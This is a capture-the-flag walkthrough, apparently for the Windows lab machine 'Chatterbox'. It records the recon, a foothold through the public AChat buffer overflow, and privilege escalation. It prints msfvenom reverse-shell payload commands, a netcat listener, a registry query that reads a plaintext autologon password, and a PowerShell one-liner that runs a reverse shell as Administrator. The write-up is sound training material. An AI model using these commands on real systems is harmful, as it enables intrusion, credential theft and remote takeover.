# Chatterbox — Medium — Windows

**Date:** 3 August 2026

---

## Tags
`#windows` `#achat` `#buffer-overflow` `#rce` `#autologon` `#registry-creds` `#runas` `#pscredential` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | 10.129.44.105                                                  |
| OS         | Windows 7 Professional (SP1)                                   |
| Open ports | 135, 139, 445, 9255, 9256 (+ dynamic RPC)                      |
| Services   | SMB; AChat chat system (9255/9256)                             |
| Foothold   | AChat 0.150 beta7 remote buffer overflow → shell as alfred     |
| Privesc    | Plaintext autologon creds in registry → run shell as Administrator |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.44.105

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 22:50 +0100
Nmap scan report for 10.129.44.105
Host is up (0.017s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
```

> **Note:** high-numbered dynamic RPC ports were set aside as not immediately relevant. Also worth
> knowing: on Chatterbox 9255/9256 often come back as `tcpwrapped`, a gentler `-sV` scan (or just
> researching the ports) is what identifies them as AChat.

<img width="858" height="545" alt="image" src="https://github.com/user-attachments/assets/ab07d757-4bb9-471d-bcff-716808fe2b3d" />

```
nmap -sC -sV -p135,139,445,9255,9256 10.129.44.105

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon            (AChat HTTP daemon)
9256/tcp  open  unknown        (AChat chat service)

Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
```

<img width="1365" height="1006" alt="image" src="https://github.com/user-attachments/assets/f49730d1-a60d-4e46-be34-1bd9f808a35e" />

**What each port tells me:**
- **Port 135 (MSRPC)** — Windows RPC endpoint mapper; confirms a standard Windows host.
- **Ports 139, 445 (SMB)** — file sharing. Interesting later, but with no credentials yet and no web login, not the way in.
- **Ports 9255, 9256 (AChat)** — the **AChat** LAN chat system. AChat has a well-known remote buffer overflow, so with everything else locked down, this is the obvious entry point.
- **Ports 49152–49157 (MSRPC)** — dynamic high RPC ports, normal Windows behaviour. Not targets.

---

## Enumeration Log

```
OBSERVATION: The only non-standard, promising ports are 9255/9256 (AChat)
WHAT IT TELLS ME: I need to research AChat for an exploitable vulnerability
WHAT I AM GOING TO TRY: Look up AChat exploits
WHY: AChat is the only realistic entry point, SMB has no creds and there's no web login
RESULT:
- AChat 0.150 beta7 has a public remote buffer-overflow exploit
- I generated the shellcode with the msfvenom command referenced in the exploit (matching the
  required bad characters) and set the target/attacker addresses
- Firing it landed a shell and I read user.txt (user: alfred)
WHAT NEXT: Enumerate for a privesc path
```

<img width="1176" height="242" alt="image" src="https://github.com/user-attachments/assets/b275cc46-fc01-416b-99c4-13dd9c7544fe" />

<img width="2479" height="341" alt="image" src="https://github.com/user-attachments/assets/61ee61f5-3358-4c58-abfb-9b9ec5e27b30" />

<img width="2535" height="122" alt="image" src="https://github.com/user-attachments/assets/02435fcc-3f00-4160-a2eb-1d9e16ac851e" />

<img width="2519" height="915" alt="image" src="https://github.com/user-attachments/assets/e1eaada2-6f08-4902-b19d-b6afccb0da77" />

<img width="636" height="118" alt="image" src="https://github.com/user-attachments/assets/c840dad4-2612-4f5b-ba3b-4b1ea8f991e2" />

<img width="864" height="676" alt="image" src="https://github.com/user-attachments/assets/0491c33c-02ac-4c2e-8f7d-1b5fa5778d41" />


```
OBSERVATION:
- winPEAS revealed cached AUTOLOGON credentials (a username + password stored in plaintext in the
  registry)
- But there's no open port that allows a remote login as that user, so I need a creative way to
  actually USE the credentials
WHAT IT TELLS ME: The autologon account may be Administrator (or its password reused), and I can run
  a process AS that user locally even without a login service
WHAT I AM GOING TO TRY: Use PowerShell to run a reverse shell in the context of Administrator with the
  recovered password (PSCredential + Start-Process -Credential)
WHY: With no remote-login port, "run as" locally is the way to leverage the creds
RESULT:
- Built a reverse-shell exe with msfvenom, transferred it, started a listener, and ran:
    powershell -c "$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
      $creds = New-Object System.Management.Automation.PSCredential('Administrator', $password);
      Start-Process -FilePath 'shell.exe' -Credential $creds"
- The shell came back running as Administrator and read root.txt

```

<img width="875" height="152" alt="image" src="https://github.com/user-attachments/assets/e52f7141-4d7f-419c-8a67-95d71cbcd61c" />

<img width="1394" height="800" alt="image" src="https://github.com/user-attachments/assets/67f90ed8-fc32-4cb6-ad45-2ece3b03b775" />

<img width="1203" height="187" alt="image" src="https://github.com/user-attachments/assets/cd5ab38d-6a9f-4494-8e23-ffeff3fe23d6" />

<img width="1151" height="526" alt="image" src="https://github.com/user-attachments/assets/82b91f7a-e7c5-4a48-befa-e9fb69188d6d" />

<img width="970" height="146" alt="image" src="https://github.com/user-attachments/assets/5e45ef5d-95f4-47cf-9662-9a4fb46966d1" />

<img width="2530" height="131" alt="image" src="https://github.com/user-attachments/assets/91298a38-08a0-4610-b697-b0cdbf82b1fb" />

<img width="822" height="751" alt="image" src="https://github.com/user-attachments/assets/05e689eb-5b5e-409e-8448-cb0567331798" />

---

## Foothold

**How I got in:** With SMB unusable (no credentials) and no web service, the only real surface was **AChat** on ports 9255/9256. AChat 0.150 beta7 has a public **remote buffer overflow**: an oversized, specially-crafted message overflows a stack buffer and lets an attacker execute shellcode. I generated a reverse-shell payload with the msfvenom command referenced in the exploit (respecting its bad-character set), pointed the exploit at the target, and got a shell as **alfred**.

**Command / exploit used:**
```
# AChat BOF (exploit-db 36025) — generate the payload as the exploit instructs:
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
  -e x86/unicode_mixed -b '\x00\x80\x81...' BufferRegister=EAX -f python
# paste the shellcode into the exploit, set target IP, then:
python2 achat_exploit.py       # (36025.py)
nc -lnvp <LPORT>               # → shell as alfred
```

**Why it worked:** AChat 0.150 beta7 doesn't bound-check incoming message data, so an oversized packet overwrites the saved return address and redirects execution into attacker shellcode. The exploit needs Unicode-compatible shellcode (hence the specific msfvenom encoder and bad chars), but once that's right it's straightforward unauthenticated RCE.

---

## Privilege Escalation

**Path taken (alfred → Administrator):** Running **winPEAS** surfaced cached **autologon credentials**, Windows had stored an account's username and password in **plaintext in the registry** (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, values `DefaultUserName` / `DefaultPassword`). The catch: no open port allows a remote login as that user. So instead of logging in, I ran a process *locally* in that user's context. I built a reverse-shell exe with msfvenom, and used PowerShell's `PSCredential` + `Start-Process -Credential` to launch it as **Administrator**, catching a shell as Administrator and reading root.txt.

```
# read the plaintext autologon creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# run a reverse shell AS Administrator (no remote-login service needed)
powershell -c "$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force; `
  $creds = New-Object System.Management.Automation.PSCredential('Administrator', $password); `
  Start-Process -FilePath 'C:\Users\Public\shell.exe' -Credential $creds"
# attacker listener → Administrator
```

**Why it worked:** Two failures. First, autologon stored the password in cleartext in the registry, readable by any local user, which is exactly the kind of credential leak that turns a low-priv shell into a high-priv one. Second, that password was (re)used for Administrator. The clever part was realising that "no remote-login port" doesn't stop credential reuse: `Start-Process -Credential` runs a program as another user right there on the box, so I never needed a network login service at all.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Exploited the AChat 0.150 beta7 remote buffer overflow (with the exploit's required Unicode msfvenom shellcode) to get a shell as alfred.
2. **Privesc technique in one sentence:** Recovered plaintext autologon credentials from the registry via winPEAS and ran a reverse shell as Administrator with PowerShell's `Start-Process -Credential`, since no remote-login port was available.
